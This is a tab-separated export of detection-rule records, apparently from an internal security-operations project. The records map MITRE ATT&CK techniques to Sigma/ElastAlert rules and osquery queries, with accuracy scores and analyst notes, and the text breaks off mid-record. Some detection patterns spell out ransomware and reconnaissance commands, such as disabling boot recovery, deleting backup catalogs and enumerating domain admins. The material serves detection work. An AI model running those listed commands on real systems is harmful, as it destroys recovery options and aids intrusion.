66	no	yaml	"False Positives not handled\nPartial detection and attack technique as the yaml file availableprovides incomplete information"	#FFFFFF	Process monitoring,Process commandline parameters	"{'accuracy_score': 0}"	T1543.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_pers_systemd_reload.yml", "elastalert": {"name": "systemd_service_reload_or_start_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:filebeat AND message:*systemctl* AND (*start* OR *reload*))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects a reload or a start of a service"}}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
88	yes	OSQuery	Couldnt simulate the attack using crackmapexec as its binary is not executing, so couldn't verify elastalert.	#800080	Process monitoring,Process commandline parameters,Antivirus,Binary file metadata	{"accuracy_score": 50}	T1027.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_susp_sdelete.yml", "elastalert": {"name": "secure_deletion_with_sdelete", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:\\\\\\"*sdelete*\\\\\\" AND (\\\\\\"*.AAA\\\\\\" OR \\\\\\"*.ZZZ\\\\\\"))"}}], "realert": {"minutes": 0}, "priority": 3, "description": "Detects renaming of file while deletion with SDelete tool."}}], "osquery": ["select * from windows_eventlog where channel='Security' and eventid IN (4656, 4658, 4663);", "select * from windows_eventlog where channel='Security' and eventid IN (4656, 4658, 4663) and (keywords like '%sdelete%' or keywords like '%.AAA%' or keywords like '%.ZZZ%');"], "elasticsiem": []}}}}}	2021-07-19 05:52:31.505043+00
107	no	yaml		#FFFFFF		"{'accuracy_score': 0}"	T1110	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_susp_failed_logons_single_source.yml", "elastalert": {"name": "failed_logins_with_different_accounts_from_single_source_system_0", "type": "any", "alert": ["debug"], "index": "filebeat-*", "filter": [{"query_string": {"query": "(message:*authentication*)"}}], "realert": {"minutes": 0}, "priority": 3, "description": "Detects suspicious failed logins with different user accounts from a single source system"}}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
23	yes	yaml		#800080	Process monitoring,Process commandline parameters	"{'accuracy_score': 70}"	T1546.007	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_susp_netsh_dll_persistence.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
33	yes	other	Pcap analysis	#0000FF	Authentication logs,Office  account logs	"{'accuracy_score': 80}"	T1110.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
34	no	OSQuery,yaml	This detection is mapped with atomic red attack.	#FFFFFF	Windows Registry,Process monitoring,Process commandline parameters,Windows event logs	"{'accuracy_score': 0}"	T1036.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_apt_wocao.yml", "elastalert": ""}], "osquery": ["select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
47	no		Using sysmon logs - "service stops" actions/events can be identified.	#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1489	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [".."], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
35	yes	other,OSQuery		#FFA500	Network protocol analysis,Packet capture,Process monitoring,Process use of network	{"accuracy_score": 30}	T1071.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"]}, "network": {"zeek": ["Scripts are already in SO by default installed for HTTP Protocol"], "sigma": [{"rule": "dns_tunnel_technique_from_muddywater_0", "elastalert": {"name": "dns_tunnel_technique_from_muddywater_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(event.code:\\"1\\" AND winlog.channel:\\"Microsoft\\\\-Windows\\\\-Sysmon\\\\/Operational\\" AND process.executable:(\\"*\\\\\\\\powershell.exe\\") AND process.parent.executable:(\\"*\\\\\\\\excel.exe\\") AND process.command_line:(\\"*DataExchange.dll*\\"))"}}], "realert": {"minutes": 2}, "priority": 2, "description": "Detecting DNS tunnel activity for Muddywater actor"}}], "osquery": [], "elasticsiem": []}, "windows": [{"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}]}}}}	2021-07-21 04:19:08.500683+00
10	no		Hash changes of monitored files can be reported over time. Specific locations are not mentioned in detection. So we need to identify the locations of binary files to look for.	#FFFFFF	Process commandline parameters,File monitoring	"{'accuracy_score': 0}"	T1574.010	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["SELECT * from hash where directory like 'C:\\\\%%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
38	yes	OSQuery		#008000	Windows Registry,Process monitoring,DLL monitoring	{"accuracy_score": 90}	T1547.010	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name, type, data from registry where key='HKEY_LOCAL_MACHINE\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Print\\\\\\\\Monitors\\\\\\\\';", "select name, type, data from registry where key LIKE 'HKEY_LOCAL_MACHINE\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Print\\\\\\\\Monitors\\\\\\\\%';", "select key, name, type, data from registry where key LIKE ((select key || '\\\\Control\\\\Print\\\\Monitors\\\\%' from registry where key like 'HKEY_LOCAL_MACHINE\\\\System\\\\%ControlSet%')) and data LIKE '%.dll%';", "select path, name, type, data from registry where key LIKE ((select key || '\\\\Control\\\\Print\\\\Environments\\\\Windows%\\\\Print Processors\\\\%' from registry where key like 'HKEY_LOCAL_MACHINE\\\\System\\\\%ControlSet%')) and data LIKE '%.dll%';"], "elasticsiem": [{"name": "Potential Port Monitor or Print Processor Registration Abuse", "query": "registry where event.type in (\\"creation\\", \\"change\\") and\\n  registry.path : (\\"HKLM\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Print\\\\\\\\Monitors\\\\\\\\*\\",\\n    \\"HKLM\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Print\\\\\\\\Environments\\\\\\\\Windows*\\\\\\\\Print Processors\\\\\\\\*\\") and\\n  registry.data.strings : \\"*.dll\\"\\n"}, {"name": "Suspicious PrintSpooler Service Executable", "query": "process where process.name: \\"spoolsv.exe\\" and\\n    file.extension : (\\"exe\\", \\"dll\\") and\\n    not file.path : (\\"?:\\\\Windows\\\\System32\\\\spool\\\\*\\")"}, {"name": "Untrusted DLL loaded by spoolsv", "query": "library where event.action: \\"load\\" and\\n    not dll.code_signature.trusted == \\"true\\" and\\n    process.name: (\\"spoolsv.exe\\")"}]}}}}}	2021-07-20 12:12:43.689322+00
36	no	OSQuery	["1. Find/Explore fameworks/tools to detect windows API usage for LogonUser and SetThreadToken."]	#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1134.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%runas%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
67	no	OSQuery		#FFFFFF	Process use of network,Process monitoring	"{'accuracy_score': 0}"	T1102	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
21	yes	OSQuery		#800080	Process monitoring,Data loss prevention,File monitoring	"{'accuracy_score': 50}"	T1052	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["SELECT * FROM usb_devices;", "SELECT device, device_alias, flags, path,type from mounts;"]}, "windows": {"other": [], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
109	yes	yaml,OSQuery		#800080	Windows Registry	"{'accuracy_score': 70}"	T1546.010	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "sysmon_new_dll_added_to_appinit_dlls_registry_key.yml", "elastalert": ""}], "osquery": ["select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows' and name='AppInit_DLLs';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
144	yes			#FFA500	Process monitoring,Process commandline parameters,Process monitoring	"{'accuracy_score': 10}"	T1201	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [], "osquery": ["select usr.username, sht.command, sht.history_file from shell_history sht JOIN users usr ON sht.uid = usr.uid WHERE sht.uid IN (SELECT uid from users);", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}, "windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%net.exe%';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
192	no	other	Not found anything.	#FFFFFF	Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1574.007	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \\"findstr,\\" \\"net,\\" and \\"python\\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\\n2. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
123	yes			#008000	Process monitoring,Process monitoring,Process commandline parameters	{"accuracy_score": 90}	T1082	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_config_options.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_report.zeek"], "sigma": [{"rule": "reconnaissance_activity_with_net_command_0", "elastalert": {"name": "reconnaissance_activity_with_net_command_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(event.code:\\"1\\" AND winlog.channel:\\"Microsoft\\\\-Windows\\\\-Sysmon\\\\/Operational\\" AND process.command_line:(\\"tasklist\\" OR \\"net\\\\ time\\" OR \\"systeminfo\\" OR \\"whoami\\" OR \\"nbtstat\\" OR \\"net\\\\ start\\" OR \\"*\\\\\\\\net1\\\\ start\\" OR \\"qprocess\\" OR \\"nslookup\\" OR \\"hostname.exe\\" OR \\"*\\\\\\\\net1\\\\ user\\\\ \\\\/domain\\" OR \\"*\\\\\\\\net1\\\\ group\\\\ \\\\/domain\\" OR \\"*\\\\\\\\net1\\\\ group\\\\ \\\\\\"domain\\\\ admins\\\\\\"\\\\ \\\\/domain\\" OR \\"*\\\\\\\\net1\\\\ group\\\\ \\\\\\"Exchange\\\\ Trusted\\\\ Subsystem\\\\\\"\\\\ \\\\/domain\\" OR \\"*\\\\\\\\net1\\\\ accounts\\\\ \\\\/domain\\" OR \\"*\\\\\\\\net1\\\\ user\\\\ net\\\\ localgroup\\\\ administrators\\" OR \\"netstat\\\\ \\\\-an\\"))"}}], "realert": {"minutes": 2}, "priority": 3, "description": "Detects a set of commands often used in recon stages by different attack groups"}}], "osquery": [], "elasticsiem": []}, "windows": [{"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%systeminfo%';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}]}}}}	2021-07-26 17:46:19.133068+00
46	no	OSQuery		#FFFFFF	Process monitoring,Process monitoring,Process commandline parameters	"{'accuracy_score': 0}"	T1518.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%tasklist%';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
145	yes		MuddyWater has used malware that checked if the C:\\\\ProgramData\\\\ folder had folders or files with the keywords "Kasper," "Panda," or "ESET."\n\nFor Network the PCAP of Malware - wannacry_ransomware but not able to find sample pcap to have those logs in ELK, but added the Alert Rule. Tried http://dataset.tlm.unavarra.es/ransomware/, https://precisionsec.com/wannacry-pcap-smb-445/ - No Luck	#800080	File monitoring	{"accuracy_score": 50}	T1083	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": [{"zeek": [], "other": [], "sigma": [{"key": "", "value": ""}], "osquery": ["test"], "elasticsiem": []}], "network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_config_options.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_report.zeek"], "sigma": [{"rule": "wannacry_ransomware_0", "elastalert": {"name": "wannacry_ransomware_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*\\\\\\\\tasksche.exe OR *\\\\\\\\mssecsvc.exe OR *\\\\\\\\taskdl.exe OR *\\\\\\\\taskhsvc.exe OR *\\\\\\\\taskse.exe OR *\\\\\\\\111.exe OR *\\\\\\\\lhdfrgui.exe OR *\\\\\\\\diskpart.exe OR *\\\\\\\\linuxnew.exe OR *\\\\\\\\wannacry.exe) OR process.executable:*WanaDecryptor* OR (process.command_line:*icacls* AND process.command_line:*\\\\/grant* AND process.command_line:*Everyone\\\\:F* AND process.command_line:*\\\\/T* AND process.command_line:*\\\\/C* AND process.command_line:*\\\\/Q*) OR (process.command_line:*bcdedit* AND process.command_line:*\\\\/set* AND process.command_line:*\\\\{default\\\\}* AND process.command_line:*recoveryenabled* AND process.command_line:*no*) OR (process.command_line:*wbadmin* AND process.command_line:*delete* AND process.command_line:*catalog* AND process.command_line:*\\\\-quiet*) OR process.command_line:*@Please_Read_Me@.txt*)"}}], "realert": {"minutes": 2}, "priority": 1, "description": "Detects WannaCry ransomware activity"}}], "osquery": [], "elasticsiem": []}, "windows": [{"other": [], "sigma": [], "osquery": ["select * from ntfs_journal_events;", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}]}}}}	2021-07-21 04:26:48.150952+00
39	no	OSQuery		#FFFFFF	Process monitoring,Process use of network	"{'accuracy_score': 0}"	T1102.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"]}, "windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
55	no	OSQuery		#FFFFFF	Process monitoring,Process use of network	"{'accuracy_score': 0}"	T1102.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"]}, "windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
70	yes	OSQuery		#800080	Loaded DLLs	"{'accuracy_score': 50}"	T1547.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name, type, data from registry where key='HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders\\\\';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
183	no	OSQuery		#FFFFFF	Process monitoring,Process commandline parameters	"{'accuracy_score': 0}"	T1049	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%netstat%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
185	no	OSQuery		#FFFFFF	File monitoring,Process monitoring	"{'accuracy_score': 0}"	T1070.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file_events;", "select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%CMD%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
24	yes	other,OSQuery	["1. Detection is primarily installed software dependent."]	#FFA500	Antivirus,System calls,Process monitoring	"{'accuracy_score': 20}"	T1203	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';", "select DISTINCT p.name, p.path, pos.remote_address, pos.remote_port from process_open_sockets pos LEFT JOIN processes p ON pos.pid = p.pid WHERE pos.remote_port != 0 AND p.name != '';"]}, "windows": {"other": ["[\\"1. Detecting software exploitation may be difficult depending on the tools available.\\", \\"2. Look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.\\"]"], "sigma": [], "osquery": ["select * from file_events;", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';", "select DISTINCT p.name, p.path, pos.remote_address, pos.remote_port from process_open_sockets pos LEFT JOIN processes p ON pos.pid = p.pid WHERE pos.remote_port != 0 AND p.name != '';", "select p.name, p.path, lp.port, lp.address, lp.protocol from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
156	yes	OSQuery	Hash changes of monitored files can be reported over time. Specific locations are not mentioned in detection. So we need to identify the locations of binary files to look for.\n\nTo run osqueries osquery configuration should include the file path as shown in below sample configuration.\n  "file_paths": {\n    "Downloads": [\n      "C:\\\\Users\\\\psl\\\\Downloads\\\\*"\n    ],\n    "ProgramData": [\n      "C:\\\\ProgramData\\\\*"\n    ],\n    "RedTeam": [\n      "C:\\\\RedTeam\\\\*",\n      "C:\\\\AtomicRedTeam\\\\*"\n    ],\n    "TEMP": [\n      "C:\\\\Windows\\\\TEMP",\n      "C:\\\\Users\\\\psl\\\\AppData\\\\Local\\\\Temp"\n    ]\n  }\nAlso, to mitigate the attack we can verify that UAC Bypass is has control. Verify the values for below 2 keys in registry.\nselect name,type,data from registry where key like 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' and name IN ('ConsentPromptBehaviorUser', 'EnableInstallerDetection');	#FFA500	Process commandline parameters,File monitoring	"{'accuracy_score': 30}"	T1574.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["1. Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.", "2. Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques."], "sigma": [], "osquery": ["SELECT * from hash where directory like 'C:\\\\%%';", "select * from ntfs_journal_events where path like '%TEMP%';", "select * from ntfs_journal_events where path like 'C:\\\\Users\\\\%\\\\AppData\\\\Local\\\\Temp';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
132	no	OSQuery		#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1007	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%sc%';", "select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%tasklist%';", "select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%net.exe%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
133	yes	OSQuery		#800080	Windows Registry	"{'accuracy_score': 50}"	T1546.012	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name,type,data from registry where key like 'HKEY_LOCAL_MACHINE\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\%\\\\\\\\';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
136	no	other		#FFFFFF	Windows event logs,Authentication logs,API monitoring	"{'accuracy_score': 0}"	T1134.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Examine data in users SID-History attributes using the PowerShell Get-ADUser cmdlet , especially users who have SID-History values from the same domain.\\", \\"2. Monitor account management events on Domain Controllers for successful and failed changes to SID-History.\\", \\"3. Monitor for Windows API calls to the DsAddSidHistory function.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
202	no	OSQuery,yaml		#FFFFFF	Windows Registry	"{'accuracy_score': 0}"	T1137.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "sysmon_office_test_regadd.yml", "elastalert": ""}], "osquery": ["select name, type, data from registry where key='HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf';", "select name, type, data from registry where key='HKEY_USERS\\\\%\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
459	yes	other	P1	#008000	Packet capture,Process use of network,Network protocol analysis	{"accuracy_score": 90}	T1570	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_report.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb1_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb2_detect.zeek"], "sigma": [{"rule": "rundll32_without_parameters_0", "elastalert": {"name": "rundll32_without_parameters_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "process.command_line:\\"rundll32.exe\\""}}], "realert": {"minutes": 2}, "priority": 2, "description": "Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module"}}], "osquery": [], "elasticsiem": []}}}}}	2021-08-04 15:18:51.820082+00
148	no	other		#FFFFFF	Network device logs,Network device runtime memory,Network device command history,Network device configuration	"{'accuracy_score': 0}"	T1059.008	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Consider reviewing command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.\\", \\"2. Consider comparing a copy of the network device configuration against a known-good version to discover unauthorized changes to the command interpreter.\\", \\"3. Compare the run-time memory, though this is non-trivial and may require assistance from the vendor.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
152	no	other	["1. Third-party infrastructure and trust relationship is required"]	#FFFFFF	Azure activity logs,Stackdriver logs,AWS CloudTrail logs,Application logs,Authentication logs,Thirdparty application logs	"{'accuracy_score': 0}"	T1199	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Establish monitoring for activity conducted by second and third party providers and other trusted entities\\", \\"2. monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
157	no	other	Not able to find anything.	#FFFFFF	Process commandline parameters,Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1546.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
149	yes	OSQuery	Registry Monitoring	#FFFFFF	Process monitoring	"{'accuracy_score': 50}"	T1112	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name, type from registry where key='HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows' and name='AppInit_DLLs';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows' and name='AppInit_DLLs';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Netsh';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\system\\\\CurrentControlSet\\\\Control\\\\Lsa';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\appcompatflags\\\\installedsdb';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\appcompatflags\\\\custom';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options';", "select * from registry where key='HKEY_CURRENT_USER\\\\Environment';", "select name,type,data from registry where key='HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop';", "select name,type,data from registry where key='HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run';", "select name,type,data from registry where key='HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run';", "select name,type,data from registry where key='HKEY_USERS\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon';", "select name,type,data from registry where 